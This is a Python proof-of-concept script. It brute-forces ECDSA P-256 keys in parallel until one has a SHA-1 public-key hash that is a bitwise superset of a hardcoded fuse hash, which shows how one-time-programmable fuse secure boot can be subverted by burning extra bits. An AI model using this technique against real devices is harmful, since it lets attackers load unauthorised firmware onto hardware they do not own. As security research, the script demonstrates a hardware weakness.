#!/usr/bin/env python3
"""
Script to generate ECDSA keys (NIST P-256) in parallel and find a key whose SHA-1 hash is a superset
of the hardcoded hash a041418172240840a0912002902124508047550c (118 zeros, 42 ones),
demonstrating vulnerabilities in OTP fuse-based secure boot systems.
"""
import hashlib
import multiprocessing as mp
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.backends import default_backend

def count_ones(hash_hex: str) -> int:
    """Count the number of 1's in the binary representation of a 160-bit SHA-1 hash."""
    binary = bin(int(hash_hex, 16))[2:].zfill(160)
    return binary.count('1')

def is_superset(new_hash_hex: str, stored_hash_hex: str) -> bool:
    """Check if new_hash_hex has 1's in all positions where stored_hash_hex has 1's."""
    new_binary = bin(int(new_hash_hex, 16))[2:].zfill(160)
    stored_binary = bin(int(stored_hash_hex, 16))[2:].zfill(160)
    return all(stored_binary[i] == '0' or new_binary[i] == '1' for i in range(160))

def generate_and_check_superset_key(trial_counter: mp.Value, lock: mp.Lock, target_hash: str, stop_event: mp.Event) -> None:
    """Generate an ECDSA key and check if its SHA-1 hash is a superset of the target hash."""
    while not stop_event.is_set():
        private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
        public_key = private_key.public_key()
        pubkey_der = public_key.public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        hash_obj = hashlib.sha1(pubkey_der)
        hash_hex = hash_obj.hexdigest()
        ones = count_ones(hash_hex)
        zeros = 160 - ones
        
        with lock:
            trial_counter.value += 1
            trial_count = trial_counter.value
        
        if is_superset(hash_hex, target_hash):
            extra_ones = count_ones(hash_hex) - count_ones(target_hash)
            privkey_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ).decode('utf-8')
            pubkey_pem = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            ).decode('utf-8')
            with lock:
                with open('superset_keys_sha1.txt', 'a') as f:
                    f.write(f"Trial: {trial_count}, New Hash: {hash_hex}, Zeros: {zeros}, Ones: {ones}, Superset of: {target_hash}, Extra 1's: {extra_ones}\n")
                    f.write("Private Key:\n")
                    f.write(privkey_pem)
                    f.write("Public Key:\n")
                    f.write(pubkey_pem)
                    f.write("\n" + "-"*80 + "\n")
                print(f"Trial {trial_count}: Superset found! New hash: {hash_hex} (Zeros: {zeros}, Ones: {ones}) is a superset of target hash: {target_hash} (Extra 1's: {extra_ones})")
                stop_event.set()  # Signal other processes to stop

def main():
    """Run key generation in parallel to find a superset of the hardcoded SHA-1 hash."""
    target_hash = "a041418172240840a0912002902124508047550c"  # 118 zeros, 42 ones
    num_processes = mp.cpu_count()  # Use all available CPU cores
    trial_counter = mp.Value('i', 0)  # Shared trial counter
    lock = mp.Lock()  # Lock for thread-safe counter and file access
    stop_event = mp.Event()  # Event to signal when a superset is found
    
    print(f"Generating ECDSA keys (NIST P-256) in parallel ({num_processes} processes) to find SHA-1 hashes that are supersets of {target_hash}...")
    processes = [
        mp.Process(target=generate_and_check_superset_key, args=(trial_counter, lock, target_hash, stop_event))
        for _ in range(num_processes)
    ]
    
    try:
        for p in processes:
            p.start()
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        stop_event.set()
        for p in processes:
            p.terminate()
        print(f"\nStopped by user after {trial_counter.value} trials.")

if __name__ == "__main__":
    main()
